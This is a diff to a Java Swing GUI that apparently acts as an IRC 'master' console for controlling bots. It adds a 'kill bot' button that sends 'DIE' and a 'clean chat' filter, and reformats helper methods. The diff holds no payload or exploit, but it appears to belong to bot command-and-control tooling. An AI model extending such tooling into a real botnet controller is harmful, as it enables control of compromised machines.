@@ -30,17 +30,20 @@ public class Gui {
     private JPanel buttonPanel;
     private JPanel graphpanel;
     private JScrollPane logScrollPane;
+    private JRadioButton killBotRadioButton;
+    private JCheckBox cleanchatCheckBox;
 
     public Gui() throws Exception {
         setNickAndLogin(getRandomNumber());
         masterbot = new Master(server, nick, login, channel);
         masterbot.connectToIRC();
         logTextArea1.setEditable(false);
+        cleanchatCheckBox.setSelected(false);
         Timer timer = new Timer(100, new ActionListener() {
             @Override
             public void actionPerformed(ActionEvent e) {
                 try {
-                    String line = masterbot.receiveMessageForMastergui();
+                    String line = masterbot.receiveMessageForMastergui(cleanchatCheckBox.isSelected());
                     if (!(line.isEmpty())) {
                         logTextArea1.append(line + "\n");
                     }
@@ -88,18 +91,20 @@ public class Gui {
                 commandTextField1.setText(null);
             }
         });
+        killBotRadioButton.addActionListener(new ActionListener() {
+            @Override
+            public void actionPerformed(ActionEvent e) { commandTextField1.setText("DIE"); }
+        });
     }
 
-    private static void setNickAndLogin(int randomNumber)
-    {
+    private static void setNickAndLogin(int randomNumber) {
         String number = Integer.toString(randomNumber);
         System.out.println("BOT_NO:" + number);
         nick = nick.concat(number);
         login = login.concat(number);
     }
 
-    private static int getRandomNumber()
-    {
+    private static int getRandomNumber() {
         Random randomGenerator = new Random();
         return randomGenerator.nextInt(9999);
     }
